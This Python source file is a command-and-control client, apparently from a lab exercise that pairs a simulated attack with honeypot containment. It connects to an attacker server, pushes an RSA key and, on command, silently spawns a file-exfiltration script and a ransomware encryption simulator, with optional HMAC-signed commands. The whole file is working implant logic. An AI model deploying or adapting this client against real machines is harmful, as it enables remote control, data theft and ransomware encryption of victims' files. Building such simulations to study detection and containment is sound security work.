"""
victim/c2_client.py  —  Person 1
Command-and-Control client running on the Victim VM.

Connects to the attacker's C2 server (attacker/c2_server.py) and:
  1. Sends PUSH_KEY to deliver the RSA public key (or receives one from attacker)
  2. Listens for commands: START_EXFIL, START_ENCRYPT, STOP
  3. Dispatches each command to the appropriate local handler

In AUTH_MODE the client wraps every outgoing command with an HMAC-SHA256
signature using the shared secret — matching what the server expects.

Log format: JSON-lines → logs/c2.log  (same file as server, distinguished by 'side' field)
"""

import sys
import os
import socket
import hmac
import hashlib
import json
import time
import logging
import subprocess
from datetime import datetime, timezone
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import config


# ──────────────────────────────────────────────────────────────────────────────
# Logging
# ──────────────────────────────────────────────────────────────────────────────

def _setup_logger(log_dir: str) -> logging.Logger:
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    log_path = Path(log_dir) / "c2.log"
    logger = logging.getLogger("c2_client")
    logger.setLevel(logging.DEBUG)
    if not logger.handlers:
        fh = logging.FileHandler(log_path)
        fh.setFormatter(logging.Formatter("%(message)s"))
        logger.addHandler(fh)
        sh = logging.StreamHandler(sys.stdout)
        sh.setFormatter(logging.Formatter("[c2_client] %(message)s"))
        logger.addHandler(sh)
    return logger


def _log(logger: logging.Logger, event: str, **extra) -> None:
    record = {
        "ts": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "module": "c2",
        "side": "victim",
        "event": event,
        **extra,
    }
    logger.info(json.dumps(record))


# ──────────────────────────────────────────────────────────────────────────────
# HMAC helpers (mirrors c2_server.py — must stay in sync)
# ──────────────────────────────────────────────────────────────────────────────

_HMAC_SEP = b"|SIG|"


def _sign_command(raw_cmd: bytes) -> bytes:
    tag = hmac.new(config.HMAC_SECRET, raw_cmd, hashlib.sha256).hexdigest().encode()
    return raw_cmd + _HMAC_SEP + tag


def _wrap_command(cmd: str, auth_mode: bool) -> bytes:
    raw = cmd.encode()
    return (_sign_command(raw) if auth_mode else raw) + b"\n"


# ──────────────────────────────────────────────────────────────────────────────
# Socket helpers
# ──────────────────────────────────────────────────────────────────────────────

def _readline(sock: socket.socket, timeout: float = 10.0) -> str:
    """Read one newline-terminated line from *sock*."""
    sock.settimeout(timeout)
    buf = b""
    while b"\n" not in buf:
        chunk = sock.recv(1024)
        if not chunk:
            break
        buf += chunk
    sock.settimeout(None)
    return buf.decode(errors="replace").strip()


# ──────────────────────────────────────────────────────────────────────────────
# Command senders
# ──────────────────────────────────────────────────────────────────────────────

def send_push_key(
    sock: socket.socket,
    pub_key_path: str,
    auth_mode: bool,
    logger: logging.Logger,
) -> bool:
    """
    Read the RSA public key PEM from disk and send it to the attacker C2 server.

    Returns True on ACK, False on error.
    """
    try:
        with open(pub_key_path, "rb") as fh:
            key_pem = fh.read()
    except FileNotFoundError:
        _log(logger, "push_key_error", reason=f"public key not found at {pub_key_path}")
        return False

    hex_key = key_pem.hex()
    cmd = f"PUSH_KEY:{hex_key}"
    sock.sendall(_wrap_command(cmd, auth_mode))
    response = _readline(sock)
    success = response.startswith("ACK")
    _log(logger, "push_key_sent", ack=success, response=response)
    return success


def send_command(
    sock: socket.socket,
    cmd: str,
    auth_mode: bool,
    logger: logging.Logger,
) -> str:
    """Send a command and return the server's response line."""
    sock.sendall(_wrap_command(cmd, auth_mode))
    response = _readline(sock)
    _log(logger, "command_sent", cmd=cmd, response=response)
    return response


# ──────────────────────────────────────────────────────────────────────────────
# Local action dispatch — called when the client receives a command
# ──────────────────────────────────────────────────────────────────────────────

def _on_start_exfil(logger: logging.Logger) -> None:
    """
    Handle START_EXFIL: launch victim/transfer_sender.py to begin file exfiltration.

    This spawns a subprocess so the C2 loop can continue receiving commands
    while transfer is in progress.
    """
    _log(logger, "start_exfil_dispatched")
    sender_script = Path(__file__).parent / "transfer_sender.py"
    subprocess.Popen(
        [sys.executable, str(sender_script)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def _on_start_encrypt(logger: logging.Logger) -> None:
    """
    Handle START_ENCRYPT: launch ransomware/simulator.py.

    The simulator imports shared/crypto.py and config.py, so both must be in place.
    """
    _log(logger, "start_encrypt_dispatched")
    simulator_script = _ROOT / "ransomware" / "simulator.py"
    subprocess.Popen(
        [sys.executable, str(simulator_script)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def _on_stop(logger: logging.Logger) -> None:
    _log(logger, "stop_received_on_victim")
    # Nothing to kill here — honeypot/containment.py owns process termination.


# ──────────────────────────────────────────────────────────────────────────────
# Client loop — connect once and poll for commands
# ──────────────────────────────────────────────────────────────────────────────

def _client_loop(
    sock: socket.socket,
    auth_mode: bool,
    logger: logging.Logger,
) -> None:
    """
    After connection is established, read banner then enter the command-receive loop.

    The victim client is *passive*: it connects to the attacker, sends PUSH_KEY,
    then waits for the attacker to push commands.
    """
    # ── Read server banner ───────────────────────────────────────────────────
    banner = _readline(sock, timeout=15.0)
    _log(logger, "banner_received", banner=banner)

    # ── Push the RSA public key to the attacker ──────────────────────────────
    if Path(config.RSA_PUB_KEY_PATH).exists():
        send_push_key(sock, config.RSA_PUB_KEY_PATH, auth_mode, logger)
    else:
        _log(logger, "push_key_skipped", reason="public key not found on victim; attacker must supply it")

    # ── Main receive loop ────────────────────────────────────────────────────
    buf = b""
    sock.settimeout(None)  # block until data arrives

    while True:
        chunk = sock.recv(4096)
        if not chunk:
            _log(logger, "server_disconnected")
            break
        buf += chunk

        while b"\n" in buf:
            line, buf = buf.split(b"\n", 1)
            if not line:
                continue
            decoded = line.decode(errors="replace").strip()
            _log(logger, "server_message", message=decoded)

            cmd_upper = decoded.upper()

            if cmd_upper.startswith("ACK"):
                pass  # acknowledgement, no action needed
            elif cmd_upper == "START_EXFIL":
                _on_start_exfil(logger)
                send_command(sock, "ACK: START_EXFIL", auth_mode, logger)
            elif cmd_upper == "START_ENCRYPT":
                _on_start_encrypt(logger)
                send_command(sock, "ACK: START_ENCRYPT", auth_mode, logger)
            elif cmd_upper == "STOP":
                _on_stop(logger)
                send_command(sock, "ACK: STOP", auth_mode, logger)
                return  # graceful exit
            else:
                _log(logger, "unrecognised_server_message", message=decoded)


# ──────────────────────────────────────────────────────────────────────────────
# Public entry point
# ──────────────────────────────────────────────────────────────────────────────

def run_client(
    attacker_ip: str = config.ATTACKER_IP,
    port: int = config.C2_PORT,
    auth_mode: bool = config.AUTH_MODE,
    log_dir: str = config.LOG_DIR,
    retry_interval: float = 5.0,
    max_retries: int = 12,
) -> None:
    """
    Connect to the attacker C2 server and enter the command loop.

    Retries the connection up to *max_retries* times before giving up,
    sleeping *retry_interval* seconds between attempts.

    Parameters
    ----------
    attacker_ip    : str   — attacker VM IP (config.ATTACKER_IP)
    port           : int   — C2 port (config.C2_PORT)
    auth_mode      : bool  — True = HMAC-signed commands, False = naive
    log_dir        : str   — directory for c2.log
    retry_interval : float — seconds between connection retries
    max_retries    : int   — maximum number of connection attempts
    """
    logger = _setup_logger(log_dir)
    variant = "AUTHENTICATED" if auth_mode else "NAIVE"
    _log(logger, "client_starting", attacker_ip=attacker_ip, port=port, variant=variant)
    print(f"[c2_client] Connecting to {attacker_ip}:{port}  [{variant}] …")

    for attempt in range(1, max_retries + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((attacker_ip, port))
            _log(logger, "connected", attacker_ip=attacker_ip, port=port, attempt=attempt)
            print(f"[c2_client] Connected (attempt {attempt})")

            with sock:
                _client_loop(sock, auth_mode, logger)
            break  # clean exit

        except (ConnectionRefusedError, OSError) as exc:
            _log(logger, "connection_attempt_failed", attempt=attempt, error=str(exc))
            print(f"[c2_client] Attempt {attempt}/{max_retries} failed: {exc}")
            if attempt < max_retries:
                time.sleep(retry_interval)
    else:
        _log(logger, "client_gave_up", max_retries=max_retries)
        print(f"[c2_client] Could not connect after {max_retries} attempts. Exiting.")


if __name__ == "__main__":
    run_client()
